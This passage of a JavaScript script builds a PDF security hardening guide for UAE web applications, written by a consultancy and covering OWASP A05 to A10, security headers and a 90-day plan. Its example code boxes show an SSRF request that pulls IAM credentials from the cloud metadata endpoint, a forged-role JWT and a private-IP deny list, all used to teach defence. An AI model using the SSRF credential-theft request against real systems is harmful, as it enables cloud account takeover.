  "high"
);

bodyText(
  "Security misconfiguration is the most commonly found vulnerability in cloud-hosted UAE applications. " +
    "Default settings, exposed admin interfaces, verbose error messages, unnecessary services enabled, " +
    "and cloud storage misconfigurations all fall into this category."
);

subHead("Misconfigurations Found Most Frequently in UAE Environments");
bulletList(
  [
    "Cloud storage (AWS S3 / Azure Blob / Google Cloud Storage) buckets with public read access",
    "phpMyAdmin, Adminer, or database admin panels exposed on public-facing servers",
    "Verbose error pages returning stack traces with file paths, framework version, and server info",
    "Default admin credentials unchanged on WordPress, networking equipment, and IoT devices",
    "Server response headers revealing framework name and version (X-Powered-By: PHP/7.4.3)",
    "Debug mode or development flags left enabled on production deployments",
    "Kubernetes dashboards or container orchestration APIs exposed without authentication",
    "Overly permissive IAM policies in AWS / Azure granting broader access than required",
  ],
  ORANGE
);

codeBox(
  "INFORMATION DISCLOSURE VIA ERROR RESPONSE",
  "HTTP/1.1 500 Internal Server Error\nX-Powered-By: PHP/7.4.3\nServer: Apache/2.4.41\n\n" +
    "Error: SQLSTATE[42000]: Syntax error or access violation\n" +
    "File: /var/www/html/app/models/UserModel.php\nLine: 147\n\n" +
    'FIX: Return only: {"error": "An unexpected error occurred."}'
);

fixList([
  "Audit cloud storage permissions weekly using AWS Config, Azure Policy, or GCP Security Command Center",
  "Disable or restrict admin interfaces from public exposure — whitelist by IP or require VPN access",
  "Suppress verbose errors in production: log full details internally, return generic messages externally",
  "Harden all framework and platform defaults at deployment using CIS Benchmarks as a reference",
  "Remove or disable all unused features, services, ports, and accounts at the infrastructure level",
  "Implement security response headers: HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy",
  "Run automated misconfiguration scanning on every deployment (ScoutSuite, Prowler, or equivalent)",
]);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 9 — OWASP A06: VULNERABLE COMPONENTS
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A06");
sectionBand(
  "OWASP A06  ·  KNOWN EXPLOITABLE CVEs",
  "Vulnerable and Outdated Components",
  "high"
);

bodyText(
  "Using outdated libraries, frameworks, operating systems, or platforms with known, published " +
    "vulnerabilities is one of the most operationally controllable risks in web application security. " +
    "The vulnerabilities are publicly known — the fix is to update before attackers exploit them."
);

calloutBox(
  "The average UAE production environment we assess has between 8 and 23 npm/pip/Maven packages " +
    "with known CVEs — several of which are rated Critical (CVSS 9.0+). Most have available patches " +
    "that simply have not been applied. This risk is entirely within your team's control to eliminate.",
  "warning"
);

subHead("Where Vulnerable Components Appear in UAE Applications");
bulletList(
  [
    "npm / pip / Maven / Composer packages — accumulate vulnerabilities over time in any active codebase",
    "WordPress core, themes, and plugins — the highest-volume attack surface in UAE-hosted environments",
    "End-of-life OS versions (Ubuntu 18.04, CentOS 7) still common in UAE cloud instances",
    "Docker base images not updated since initial deployment — often months or years out of date",
    "Java application servers (Tomcat, JBoss) with known remote code execution CVEs unpatched",
    "Frontend JavaScript libraries (jQuery <3.x, Bootstrap 3.x) with known XSS vulnerabilities",
  ],
  YELLOW
);

subHead("Fix Guidance — Build a Patch Programme");
fixList([
  "Run npm audit / pip-audit / mvn dependency-check on every codebase — schedule weekly automated runs",
  "Integrate Dependabot, Snyk, or OWASP Dependency-Check into your CI/CD pipeline for automated alerts",
  "Define a patch SLA and enforce it: Critical CVE (CVSS ≥ 9.0) → patch within 7 days, High → 30 days",
  "Subscribe to security advisories for all frameworks in use: Node.js, Django, Rails, Laravel, etc.",
  "Pin and review base Docker images at each deployment — use distroless or minimal images where possible",
  "Maintain a Software Bill of Materials (SBOM) to know exactly what components are in production",
  "Remove unused dependencies from package.json / requirements.txt / composer.json — each is attack surface",
]);

codeBox(
  "AUTOMATED DEPENDENCY AUDIT (add to CI/CD)",
  "# Node.js\nnpm audit --audit-level=high && npm audit fix\n\n" +
    "# Python\npip-audit --require-hashes -r requirements.txt\n\n" +
    "# GitHub Actions: add Dependabot alerts in .github/dependabot.yml"
);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 10 — OWASP A07: AUTHENTICATION FAILURES
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A07");
sectionBand(
  "OWASP A07  ·  IDENTITY IS THE PERIMETER",
  "Authentication and Session Failures",
  "critical"
);

bodyText(
  "Authentication failures allow attackers to assume another user's identity — or gain administrative " +
    "access without valid credentials. This covers weak password policies, broken session management, " +
    "missing MFA on sensitive accounts, and insecure token handling (see Scenario 2 in this guide)."
);

subHead("The Most Common Authentication Failures");
bulletList(
  [
    "No rate limiting on the login endpoint — enables automated brute-force and password spray attacks",
    "No lockout policy after repeated failures — enables credential stuffing at scale",
    "JWT tokens accepted without server-side signature validation (the Scenario 2 vulnerability)",
    "Session tokens stored in localStorage rather than HttpOnly cookies — accessible to XSS scripts",
    "Session tokens that do not expire or are not invalidated server-side on logout",
    "Admin accounts without MFA — single stolen credential = full system access",
    "Passwords shorter than 8 characters, or not checked against known-breached password lists",
    "Password reset emails with tokens valid for hours or days rather than minutes",
  ],
  RED
);

codeBox(
  "JWT VULNERABILITY EXAMPLE",
  '// Decoded JWT payload attacker can modify:\n{"userId": 1847, "role": "user", "exp": 9999999999}\n\n' +
    '// Attacker modifies role and re-encodes:\n{"userId": 1847, "role": "admin", "exp": 9999999999}\n\n' +
    "// If server does NOT verify signature → accepts forged token as valid admin"
);

fixList([
  "Rate limit login endpoints: maximum 5 attempts per minute per IP, 10 per hour per account",
  "Lock accounts temporarily after 5–10 consecutive failures with progressive delay (not permanent lock)",
  "Enforce MFA on all admin and privileged accounts — no exceptions, hardware token preferred",
  "Validate JWT signatures server-side on every request — never trust token claims without verification",
  "Use HttpOnly + Secure + SameSite=Strict cookie flags for session tokens — never localStorage",
  "Invalidate session tokens server-side on logout — client-side token removal is insufficient",
  "Check passwords against HaveIBeenPwned API or equivalent on registration and password change",
  "Expire password reset tokens within 15 minutes and invalidate on first use",
]);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 11 — OWASP A08: SOFTWARE & DATA INTEGRITY
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A08");
sectionBand(
  "OWASP A08  ·  SUPPLY CHAIN RISK",
  "Software and Data Integrity Failures",
  "high"
);

bodyText(
  "Integrity failures occur when software or data can be modified or substituted without detection. " +
    "This includes loading code from untrusted CDNs, auto-updating software without signature verification, " +
    "CI/CD pipelines that execute without security gates, and deserialisation of untrusted data."
);

subHead("How Integrity Failures Manifest");
bulletList(
  [
    "JavaScript loaded from third-party CDNs without Subresource Integrity (SRI) hash validation",
    "Auto-update mechanisms that do not verify cryptographic signatures before applying updates",
    "CI/CD pipelines that run with secrets or production access on any commit without approval gates",
    "Deserialisation of untrusted data without type or integrity validation (Java, PHP, Python pickle)",
    "Container images pulled from public registries without digest pinning or signature verification",
    "npm packages with typosquatting names that execute malicious code on install",
  ],
  ORANGE
);

codeBox(
  "SUBRESOURCE INTEGRITY (SRI) — CORRECT IMPLEMENTATION",
  '<script\n  src="https://cdn.example.com/jquery-3.7.1.min.js"\n' +
    '  integrity="sha384-1H217gwSVyLSIfaLxHbE7dRb3v4mYCKbpQvzx0cegeju1MVsGrX5xXxAvs/HgeFs"\n' +
    '  crossorigin="anonymous">\n</script>'
);

fixList([
  "Always specify SRI hashes for third-party scripts and styles loaded via CDN",
  "Verify cryptographic signatures on all downloaded dependencies and packages before use",
  "Enforce code review approval gates in CI/CD — never allow untested code to deploy to production",
  "Use dependency pinning with exact version locks in production deployments",
  "Scan CI/CD pipeline configuration for secrets injection or permission scope creep",
  "Prefer private package registries over public ones for internal dependencies",
]);

divider();

sectionBand(
  "OWASP A09  ·  DWELL TIME AMPLIFIER",
  "Security Logging and Monitoring Failures",
  "high"
);

bodyText(
  "The absence of security logging and monitoring does not prevent breaches — it extends them. " +
    "The average dwell time (time between initial compromise and detection) is 197 days globally. " +
    "Comprehensive logging reduces that to days or hours."
);

fixList([
  "Log all authentication events: successful logins, failures, password resets, MFA events",
  "Log all admin actions: user creation/deletion, role changes, configuration modifications",
  "Log all access control failures: authorisation denials indicate active probing",
  "Centralise logs in a tamper-resistant SIEM or log aggregation platform (Elastic, Splunk, Datadog)",
  "Set up automated alerts: >10 failed logins/minute, admin actions outside business hours, bulk exports",
  "Test your alerting pipeline quarterly — confirm that alerts actually fire and reach the right people",
  "Retain security logs for minimum 12 months (CBUAE, ADHICS, and DIFC requirements)",
]);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 12 — OWASP A10: SSRF + SUMMARY TABLE
// ════════════════════════════════════════════════════════════════════════════
addPage("OWASP A10");
sectionBand(
  "OWASP A10  ·  CRITICAL IN CLOUD ENVIRONMENTS",
  "Server-Side Request Forgery — SSRF",
  "critical"
);

bodyText(
  "SSRF vulnerabilities allow attackers to cause the server to make outbound HTTP requests to " +
    "arbitrary destinations — including internal network resources, cloud metadata APIs, and " +
    "services that should never be accessible from the public internet."
);

subHead("Why SSRF Is Particularly Dangerous in Cloud-Hosted UAE Applications");
bulletList(
  [
    "Cloud instance metadata endpoints (169.254.169.254) expose IAM credentials — SSRF leads to account takeover",
    "Internal microservices not exposed to the internet are reachable via the SSRF-vulnerable application",
    "VPC-internal resources (databases, admin panels, orchestration APIs) accessible via server pivot",
    "Common in applications with URL preview, PDF generation, webhook handling, or image import features",
  ],
  RED
);

codeBox(
  "SSRF ATTACK — AWS METADATA CREDENTIAL THEFT",
  "// Vulnerable endpoint: POST /api/preview?url=<user-supplied>\n\n" +
    "// Attacker request:\nPOST /api/preview?url=http://169.254.169.254/latest/meta-data/iam/\n" +
    "                        security-credentials/EC2-production-role\n\n" +
    "// Response: AWS access keys valid for full EC2 role permissions"
);

fixList([
  "Whitelist allowed outbound URL destinations — block all private IP ranges by default",
  "Deny: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254, ::1, fd00::/8",
  "Disable unnecessary URI schemas: file://, gopher://, dict://, ftp:// — allow only https://",
  "In AWS, Azure, GCP: disable IMDSv1 and enforce IMDSv2 with session-oriented tokens",
  "Use a dedicated outbound proxy for user-triggered URL fetches — it enforces allowlist centrally",
  "Validate that resolved IP addresses of user-supplied hostnames fall within allowed ranges after DNS resolution",
]);

doc.y += 6;

// Summary table
subHead("OWASP Top 10 — Severity Quick Reference", WHITE);

const colW = [60, 165, 70, TW - 60 - 165 - 70];
headerRow(["ID", "VULNERABILITY", "SEVERITY", "PRIMARY FIX FOCUS"], colW);

const owaspSummary = [
  [
    "A01",
    "Broken Access Control",
    "CRITICAL",
    "Default-deny, ownership validation",
  ],
  [
    "A02",
    "Cryptographic Failures",
    "CRITICAL",
    "TLS 1.3, bcrypt/Argon2, AES-256",
  ],
  ["A03", "Injection", "CRITICAL", "Parameterised queries, CSP headers"],
  ["A04", "Insecure Design", "HIGH", "Threat modelling, rate limiting"],
  [
    "A05",
    "Security Misconfiguration",
    "HIGH",
    "Hardened defaults, response headers",
  ],
  ["A06", "Vulnerable Components", "HIGH", "Dependency audit, patch SLA"],
  [
    "A07",
    "Authentication Failures",
    "CRITICAL",
    "MFA, HttpOnly cookies, JWT validation",
  ],
  [
    "A08",
    "Software & Data Integrity",
    "HIGH",
    "SRI hashes, signed updates, CI gates",
  ],
  [
    "A09",
    "Logging & Monitoring Failures",
    "HIGH",
    "Centralised logging, SIEM alerting",
  ],
  [
    "A10",
    "Server-Side Request Forgery",
    "CRITICAL",
    "Outbound IP allowlist, IMDSv2",
  ],
];
for (const [id, vuln, sev, fix] of owaspSummary) {
  const sevColor = sev === "CRITICAL" ? RED : ORANGE;
  tableRow([id, vuln, sev, fix], colW, [CYAN, GRAY_100, sevColor, GRAY_200]);
}

// ════════════════════════════════════════════════════════════════════════════
// PAGE 13 — 90-DAY ACTION PLAN
// ════════════════════════════════════════════════════════════════════════════
addPage("Action Plan");
sectionBand("YOUR ROADMAP", "90-Day Security Hardening Action Plan");

bodyText(
  "The following three-horizon plan provides structured, sequenced actions across this week, this month, " +
    "and this quarter. Prioritise items in 'This Week' before all others — they represent immediate risk " +
    "reduction with the lowest effort-to-impact ratio."
);

actionRow("THIS WEEK\nDays 1–7", [
  "Run npm audit / pip-audit on every active codebase. Document all critical and high findings.",
  "Verify MFA is enforced on ALL admin accounts. Enable immediately where missing.",
  "Check SSL Labs score (ssllabs.com) on every public domain. Target A or A+. Fix failures.",
  "Audit public cloud storage buckets for unintended read/write access. Lock down immediately.",
  "Review login endpoint logs for evidence of brute-force or credential stuffing. Rate limit if missing.",
  "Validate that all production JWT implementations verify signatures server-side.",
]);

actionRow("THIS MONTH\nDays 8–30", [
  "Schedule a Web Application VAPT for any application handling sensitive or regulated data.",
  "Implement security response headers on all web properties (see reference page).",
  "Review and harden session management: HttpOnly + Secure + SameSite cookie flags everywhere.",
  "Patch all critical CVEs identified in the dependency audit from Week 1.",
  "Implement centralised logging and at minimum one alert (failed login threshold).",
  "Review and harden cloud IAM permissions — remove all unused roles and overly broad policies.",
]);

actionRow("THIS QUARTER\nDays 31–90", [
  "Conduct a tabletop incident response exercise: can your team contain a breach if one happens now?",
  "Run security awareness training for the engineering team focused on OWASP Top 10.",
  "Establish a recurring automated vulnerability scanning programme (monthly minimum).",
  "Document your application's threat model — even a basic data flow diagram with risk annotations.",
  "Review and update your data classification policy. Map which systems hold what tier of data.",
  "Evaluate or implement a Web Application Firewall (WAF) for all public-facing production applications.",
]);

doc.y += 8;
calloutBox(
  "If this action plan surfaced concerns about current vulnerabilities, compliance obligations, or security " +
    "programme maturity — Nexaguard Cyber Labs offers a free 30-minute risk review with no commitment. " +
    "We can help you scope a VAPT, ISO 27001 gap analysis, or a GRC programme. Book at nexaguardcyberlabs.com.",
  "tip"
);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 14 — SECURITY HEADERS QUICK REFERENCE
// ════════════════════════════════════════════════════════════════════════════
addPage("Security Headers Reference");
sectionBand(
  "QUICK REFERENCE",
  "HTTP Security Headers — Complete Implementation Guide"
);

bodyText(
  "Security headers are one of the highest-value, lowest-effort security controls available to any web " +
    "application. They instruct the browser to enforce security policies client-side. Every header below " +
    "should be present in every HTTP response from your production applications."
);

doc.y += 4;

// Headers table
const hw = [140, TW - 140 - 100, 100];
headerRow(["HEADER", "RECOMMENDED VALUE & PURPOSE", "RISK IF MISSING"], hw);

const securityHeaders = [
  [
    "Strict-Transport-Security",
    "max-age=31536000; includeSubDomains; preload\nForces HTTPS for 1 year including subdomains",
    "HTTP downgrade, MITM attacks",
  ],
  [
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self' 'nonce-{random}'\nBlocks inline scripts and XSS execution",
    "XSS exploitation succeeds",
  ],
  [
    "X-Content-Type-Options",
    "nosniff\nPrevents browser MIME-type sniffing",
    "MIME confusion attacks",
  ],
  [
    "X-Frame-Options",
    "DENY (or SAMEORIGIN)\nBlocks clickjacking via iframe embedding",
    "Clickjacking attacks",
  ],
  [
    "Referrer-Policy",
    "strict-origin-when-cross-origin\nLimits referrer info sent cross-origin",
    "Sensitive URL leakage",
  ],
  [
    "Permissions-Policy",
    "camera=(), microphone=(), geolocation=()\nDisables browser APIs not needed by your app",
    "Feature abuse, privacy",
  ],
  [
    "Cross-Origin-Opener-Policy",
    "same-origin\nIsolates browsing context from cross-origin threats",
    "Spectre-like attacks",
  ],
  [
    "Cross-Origin-Resource-Policy",
    "same-origin\nPrevents cross-site resource loading",
    "Data leakage via no-cors",
  ],
];
for (const [header, value, risk] of securityHeaders) {
  tableRow([header, value, risk], hw, [CYAN, GRAY_100, ORANGE]);
}

doc.y += 10;

codeBox(
  "NGINX — SECURITY HEADERS BLOCK (add to server {})",
  'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;\n' +
    'add_header X-Content-Type-Options "nosniff" always;\n' +
    'add_header X-Frame-Options "DENY" always;\n' +
    'add_header Referrer-Policy "strict-origin-when-cross-origin" always;\n' +
    'add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;\n' +
    "# CSP requires per-application configuration — use report-only mode first"
);

calloutBox(
  "Use securityheaders.com to check your current header configuration for free. " +
    "Target grade A. The Content-Security-Policy header requires application-specific configuration — " +
    "start with Content-Security-Policy-Report-Only to identify what to allow before enforcing.",
  "tip"
);

// ════════════════════════════════════════════════════════════════════════════
// PAGE 15 — ABOUT NEXAGUARD + CONTACT
// ════════════════════════════════════════════════════════════════════════════
addPage("About Nexaguard");
sectionBand("ABOUT", "Nexaguard Cyber Labs");

bodyText(
  "Nexaguard Cyber Labs is a Dubai-based cybersecurity consultancy serving UAE and GCC businesses. " +
    "Our work spans penetration testing and VAPT, ISO 27001 readiness and certification, GRC advisory, " +
    "and managed security services for fintechs, SaaS companies, healthcare organisations, and growing " +
    "mid-market businesses."
);
bodyText(
  "We exist to make enterprise-grade security accessible. Not by cutting corners, but by removing the " +
    "procurement overhead, account management layers, and unnecessary complexity that makes large consultancy " +
    "firms prohibitive for organisations under 250 staff. Senior practitioners on every engagement. " +
    "Honest scoping. Reports that drive actual remediation."
);

doc.y += 6;
subHead("Our Services");

const services = [
  [
    "Web Application VAPT",
    "OWASP-aligned penetration testing for web applications, APIs, and mobile apps",
  ],
  [
    "Network & Infrastructure VAPT",
    "Internal and external network penetration testing, firewall review",
  ],
  [
    "ISO 27001 Advisory",
    "Gap assessment, control implementation, and certification support",
  ],
  [
    "GRC Services",
    "NESA, CBUAE, DIFC, UAE PDPL, and ADHICS compliance programmes",
  ],
  [
    "Managed Security",
    "Ongoing security monitoring, vulnerability management, and advisory retainers",
  ],
  [
    "Security Awareness Training",
    "Technical and executive security awareness programmes for UAE teams",
  ],
];
for (const [svc, desc] of services) {
  checkSpace(22);
  const ry = doc.y;
  doc.rect(ML, ry, TW, 20).fill(DARK_CARD);
  doc.rect(ML, ry, 4, 20).fill(CYAN);
  doc.rect(ML, ry, TW, 20).strokeColor(BORDER_C).lineWidth(0.5).stroke();
  doc
    .fontSize(8.5)
    .font("Helvetica-Bold")
    .fillColor(CYAN)
    .text(svc, ML + 10, ry + 5, { width: 155, lineBreak: false });
  doc
    .fontSize(8.5)
    .font("Helvetica")
    .fillColor(GRAY_100)
    .text(desc, ML + 170, ry + 5, { width: TW - 180, lineBreak: false });
  doc.y = ry + 20;
}

doc.y += 12;
subHead("Get in Touch");

const contactDetails = [
  ["Email", "info@nexaguardcyberlabs.com"],
  ["Phone/WhatsApp", "+971 50 623 3538"],
  ["Website", "nexaguardcyberlabs.com"],
  [
    "Book a Review",
    "nexaguardcyberlabs.com/contact — free 30-minute risk review, no commitment",
  ],
  [
    "Office",
    "Building A1, Dubai Digital Park, Dubai Silicon Oasis, Dubai, UAE",
  ],
];
for (const [label, value] of contactDetails) {
  checkSpace(20);
  const ry = doc.y;
  doc
    .fontSize(9)
    .font("Helvetica-Bold")
    .fillColor(CYAN)
    .text(`${label}:`, ML, ry, { width: 90, lineBreak: false });
  doc
    .fontSize(9)
    .font("Helvetica")
    .fillColor(GRAY_100)
    .text(value, ML + 94, ry, { width: TW - 94, lineBreak: false });
  doc.y = ry + 16;
}

doc.y += 10;
doc.rect(ML, doc.y, TW, 0.5).fill(GRAY_700);
doc.y += 10;

doc
  .fontSize(7.5)
  .font("Helvetica-Oblique")
  .fillColor(GRAY_300)
  .text(
    "Disclaimer: This guide is provided for educational and informational purposes only. " +
      "The scenarios described are illustrative composites based on common vulnerability patterns and do not " +
      "identify specific organisations. This guide does not constitute professional security advice. " +
      "For a formal security assessment, contact info@nexaguardcyberlabs.com. " +
      "© 2026 Nexaguard Cyber Labs FZCO. All rights reserved.",
    ML,
    doc.y,
    { width: TW, lineGap: 2 }
  );

// ── FINALISE ──────────────────────────────────────────────────────────────────
doc.end();
console.log(
  `✅  Web Application Security Hardening Guide generated: ${OUTPUT_PATH}`
);
